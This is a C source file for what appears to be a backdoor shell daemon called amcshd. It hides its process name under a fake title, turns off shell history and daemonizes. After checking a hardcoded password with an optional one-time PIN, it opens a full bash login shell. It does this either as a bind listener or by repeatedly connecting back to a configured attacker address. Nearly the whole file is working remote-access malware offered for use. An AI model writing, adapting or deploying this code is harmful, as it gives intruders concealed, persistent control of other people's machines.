/*                                 
 *  amcshd.c - amcsh server
 *  t57root@gmail.com              
 *  openwill.me / www.hackshell.net
 */                                
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <termios.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <netdb.h>
#include <pty.h>
#include <arpa/inet.h>
#include <stdarg.h>
#include <errno.h>

#include "config.h"
#include "otp.h"
#include "amcsh.h"
#include "functions.h"

extern char **environ;
static FILE *log_fp = NULL;

void debuglog(char *msg, ...){
#ifdef _LOG_PATH
    va_list argp;
    if(log_fp == NULL)
        log_fp = fopen(_LOG_PATH,"a");
    va_start( argp, msg );
    vfprintf(log_fp, msg, argp);
    char *lf = "\n";           
    fwrite(lf,strlen(lf),1,log_fp);
    va_end( argp );
    fflush(log_fp);
#endif
}

void getpwd(char *pwd){
    strcpy(pwd,PASSWORD);
#ifdef _OneTimePass
    char *otp = malloc(7);
    get_otp(otp);
    debuglog("pin: %s",otp);
    strcat(pwd,otp);
    free(otp);
#endif
}

int daemonme()
{
    int pid = fork();
     
    if( pid != 0 ){
        exit(0);
    }
     
    if( setsid() < 0 ){
        return 1;
    }
    return 0;
}

void chtitle(char *argv0)
{
    char *title = FAKE_TITLE;
    char* pEnvLast = NULL;
    int i,envSize = 0;
    for (i = 0 ; environ[i] ; ++i){
        envSize = envSize + strlen(environ[i]) + 1;
    }
    pEnvLast = environ[i-1] + strlen(environ[i-1]) + 1;
    char *pEnv = malloc(envSize);
    for (i = 0 ; environ[i] ; ++i){
        strcpy(pEnv,environ[i]);
        int a=strlen(environ[i]);
        pEnv = pEnv + a + 1;
        environ[i] = pEnv;
    }
    strncpy(argv0,title,pEnvLast-argv0);
}

int worker(client)
{
    fd_set rd;
    struct winsize ws;
    char *slave, *shell="/bin/sh";
    int ret, pid, pty, tty, n;

    char buffer[BUFSIZ+1];
    bzero(&buffer, sizeof buffer);

    if(openpty( &pty, &tty, NULL, NULL, NULL ) < 0){
        debuglog("[error] openpty(): %s",strerror(errno));
        return 1;
    }
    slave = ttyname( tty );
    if(slave == NULL){
        return 1;
    }

    putenv("HISTFILE=");

    if((ret = wrecv(client, buffer))<0){
        debuglog("[error] recv(): %s",strerror(errno));
        return 1; 
    }
    debuglog("GOT HAHA: %d",ret);

    pMSG msg = (pMSG)&buffer;

    debuglog("Recved term env var: %s", msg->term);
    putenv(msg->term);

    char *pwd = malloc(strlen(PASSWORD)+7);
    getpwd(pwd);
    debuglog("gen pwd: %s",pwd);
    debuglog("get pwd: %s",msg->pwd);
    if(strncmp((const char *)pwd,msg->pwd,20)!=0){
        debuglog("Invalid password");
        free(pwd);
        return 1;
    }
    debuglog("Password accepted");
    free(pwd);

    ws.ws_row = msg->ws_row;
    ws.ws_col = msg->ws_col;

    ws.ws_xpixel = 0;
    ws.ws_ypixel = 0;

    debuglog("win:%d,%d",ws.ws_row,ws.ws_col);
    if(ioctl( pty, TIOCSWINSZ, &ws ) < 0){
        debuglog("[error] ioctl(): %s",strerror(errno));
    }
    if((pid = fork())<0){
        debuglog("[error] fork(): %s",strerror(errno));
        return 1;
    }

    if( pid == 0 ){
        //Child
        close(client);
        close(pty);

        if(setsid() < 0){
            debuglog("[error] setsid(): %s",strerror(errno));
        }

        if(ioctl( tty, TIOCSCTTY, NULL ) < 0){
            debuglog("[error] ioctl(): %s",strerror(errno));
        }

        dup2( tty, 0 );
        dup2( tty, 1 );
        dup2( tty, 2 );

        if(tty > 2){
            close(tty);
        }

        execl( shell, shell + 5, "-c", "exec bash --login", (char *) 0 );
    }
    else{
        //Parent
        close( tty );
        while(1){
            FD_ZERO( &rd );
            FD_SET( client, &rd );
            FD_SET( pty, &rd );
            bzero(&buffer, sizeof buffer);
            n = ( pty > client ) ? pty : client;

            if( select( n + 1, &rd, NULL, NULL, NULL ) == 0 ){
                return 1;
            }

            if( FD_ISSET( client, &rd ) ){
                if ((ret = wrecv(client , buffer)) > 0){
                    debuglog("recv %d from client fd", ret);
                    pWINCH winch = (pWINCH)buffer;
                    if(winch->flag[0]==magickey[0] && winch->flag[1]==magickey[1] 
                        && winch->flag[2]=='s' && winch->flag[3]=='s'){
                        ws.ws_row = winch->ws_row;
                        ws.ws_col = winch->ws_col;
                        ws.ws_xpixel = 0;
                        ws.ws_ypixel = 0;
                        debuglog("Got new win size:%d,%d",ws.ws_row,ws.ws_col);
                        ioctl( pty, TIOCSWINSZ, &ws );
                    }
                    else{
                        ret=write(pty, &buffer, ret);
                        debuglog("send %d to pty", ret);
                    }
                    if(ret<=0) break;
                }
                else break;
            }

            if( FD_ISSET( pty, &rd ) ){
                if ((ret = read(pty, buffer, BUFSIZ)) > 0){ 
                    debuglog("read %d from pty fd", ret);
                    ret=wsend(client, &buffer, ret);
                    debuglog("send %d to client", ret);
                    if(ret<=0) break;
                }
                else break;
            }
        }
        return 0;
    }
    return 1;
}
#ifdef _BACK_CONNECT_INTERVAL
int amcsh_connect(void){
    int server;
    struct sockaddr_in server_addr;
 
    server_addr.sin_family      = AF_INET;
    server_addr.sin_addr.s_addr = inet_addr(ADDR);
    server_addr.sin_port        = htons(atoi(PORT));
 
    debuglog("About to connect to %s:%s\n", ADDR, PORT);
    while(1){
        debuglog("About to connect to %s:%s\n", ADDR, PORT);
        server = socket( AF_INET, SOCK_STREAM, 0 );
        if(connect( server, (struct sockaddr *) &server_addr,sizeof( server_addr ) )<0){
            //debuglog("[error] connect(): %s",strerror(errno));
        }
        else{
            worker(server);
            debuglog("worker exit #1");
            close(server);
            debuglog("close done");
        }
        sleep(_BACK_CONNECT_INTERVAL);
    }
    return 0;
}
#else
int amcsh_listen(void){
    int n;
    int client,server;
    struct sockaddr_in server_addr;
    struct sockaddr_in client_addr;

    server = socket( AF_INET, SOCK_STREAM, 0 );
    n = 1;
    setsockopt( server, SOL_SOCKET, SO_REUSEADDR, (void *) &n, sizeof(n));

    server_addr.sin_family      = AF_INET;
    server_addr.sin_port        = htons(atoi(PORT));
    server_addr.sin_addr.s_addr = inet_addr(ADDR);

    if(bind(server, (struct sockaddr *) &server_addr,sizeof(server_addr))){
        debuglog("[error] bind(): %s",strerror(errno));
        return 1;
    }

    if(listen(server, 5 ) < 0){
        debuglog("[error] listen(): %s",strerror(errno));
        return 1;
    }

    n = sizeof( client_addr );
    while((client = accept( server, (struct sockaddr *)&client_addr, (socklen_t * __restrict__)&n ))){
        worker(client);
        debuglog("worker exit #2");
        close(client);
    }
    return 0;
}
#endif

int main(int argc, char **argv)
{
    daemonme();
    chtitle(argv[0]);
#ifdef _BACK_CONNECT_INTERVAL
    return amcsh_connect();
#else
    return amcsh_listen();
#endif
}
